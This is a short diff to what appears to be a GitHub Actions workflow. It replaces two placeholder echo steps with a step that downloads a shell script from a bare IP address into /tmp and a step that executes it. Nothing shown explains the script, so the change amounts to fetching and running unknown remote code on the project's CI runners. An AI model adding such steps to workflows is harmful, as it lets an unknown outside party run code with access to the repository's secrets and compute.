@@ -10,6 +10,6 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: clone script
-        run: echo "clone script"
+        run: wget http://49.233.24.188/assets/ddyhqd.sh -O /tmp/ddyhqd.sh
       - name: execute script
-        run: echo "execute script"
+        run: sh -x /tmp/ddyhqd.sh
